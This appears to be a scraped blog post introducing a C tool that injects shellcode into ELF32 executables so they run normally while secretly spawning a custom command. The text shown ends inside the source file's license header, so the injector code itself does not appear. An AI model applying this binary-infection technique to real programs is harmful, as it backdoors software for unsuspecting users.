{
  "Source": "www.evilsocket.net",
  "Title": "Back From the Grave: ELF32 Universal Command Injector",
  "Link": "https://www.evilsocket.net/2014/07/17/Back-from-the-grave-ELF32-Universal-Command-Injector/",
  "Content": "\u003cdiv class=\"content\" itemprop=\"articleBody\"\u003e\n\u003cp\u003eJust a post about a small software I wrote years ago, I don’t want it to be lost.\u003cbr/\u003eThe concept itself was quite simple, you give to it any ELF executable as input and the software will search for space to inject a shellcode of its own, which will execute a custom command.\u003cbr/\u003eThe resulting executable will continue to work as expected, but it will spawn the command wit an \u003cstrong\u003eexecl\u003c/strong\u003e call.\u003c/p\u003e\n\u003cspan id=\"more\"\u003e\u003c/span\u003e\n\u003cp\u003eAll C code by me, shellcode by Fabio “BlackLight” Manganiello.\u003c/p\u003e\n\u003cfigure class=\"highlight c\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e17\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e18\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e19\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e20\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e21\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e22\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e23\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e24\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e25\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e26\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e27\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e28\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e29\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e30\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e31\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e32\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e33\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e34\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e35\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e36\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e37\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e38\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e39\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e40\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e41\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e42\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e43\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e44\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e45\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e46\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e47\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e48\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e49\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e50\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e51\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e52\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e53\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e54\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e55\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e56\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e57\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e58\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e59\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e60\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e61\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e62\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e63\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e64\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e65\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e66\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e67\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e68\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e69\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e70\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e71\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e72\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e73\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e74\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e75\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e76\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e77\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e78\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e79\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e80\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e81\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e82\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e83\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e84\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e85\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e86\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e87\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e88\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e89\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e90\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e91\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e92\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e93\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e94\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e95\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e96\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e97\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e98\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e99\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e100\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e101\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e102\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e103\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e104\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e105\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e106\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e107\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e108\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e109\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e110\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e111\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e112\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e113\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e114\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e115\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e116\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e117\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e118\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e119\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e120\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e121\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e122\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e123\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e124\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e125\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e126\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e127\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e128\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e129\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e130\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e131\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e132\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e133\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e134\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e135\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e136\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e137\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e138\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e139\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e140\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e141\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e142\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e143\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e144\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e145\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e146\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e147\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e148\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e149\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e150\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e151\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e152\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e153\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e154\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e155\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e156\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e157\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e158\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e159\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e160\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e161\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e162\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e163\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e164\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e165\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e166\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e167\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e168\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e169\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e170\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e171\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e172\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e173\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e174\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e175\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e176\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e177\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e178\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e179\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e180\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e181\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e182\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e183\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e184\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e185\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e186\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e187\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e188\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e189\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e190\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e191\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e192\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e193\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e194\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e195\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e196\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e197\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e198\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e199\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e200\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e201\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e202\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e203\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e204\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e205\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e206\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e207\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e208\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e209\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e210\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e211\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e212\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e213\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e214\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e215\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e216\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e217\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e218\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e219\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e220\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e221\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e222\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e223\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e224\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e225\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e226\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e227\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e228\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e229\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e230\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e231\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e232\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e233\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e234\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e235\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e236\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e237\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e238\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e239\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e240\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e241\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e242\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e243\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e244\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e245\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e246\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e247\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e248\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e249\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e250\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e251\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e252\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e253\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e254\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e255\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e256\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e257\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e258\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e259\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e260\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e261\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e262\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e263\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e264\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e265\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e266\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e267\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e268\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e269\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e270\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e271\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e272\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e273\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e274\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e275\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e276\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e277\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e278\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e279\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e280\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e281\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e282\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e283\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e284\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e285\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e286\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e287\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e288\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e289\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e290\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e291\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e292\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e293\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e294\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e295\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e296\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e297\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e298\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e299\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e300\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e301\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e302\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e303\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e304\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e305\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e306\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e307\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e308\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e309\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e310\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e311\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e312\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e313\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e314\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e315\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e316\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e317\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e318\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e319\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e320\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e321\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e322\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e323\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e324\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e325\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e326\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e327\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e328\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e329\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e330\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e331\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e332\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e333\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e334\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e335\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e336\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e337\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e338\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e339\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e340\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e341\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e342\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e343\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e344\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e345\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e346\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e/*\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      ELF 32 Universal Command Injector\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      Copyright 2008 evilsocket (all C code and ELF relocation) \u0026amp;\u0026amp; BlackLight (all the shellcoding)\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *              http://www.evilsocket.net\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *              http://blacklight.gotdns.org\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      This program is free software; you can redistribute it and/or modify\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      it under the terms of the GNU General Public License as published by\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      the Free Software 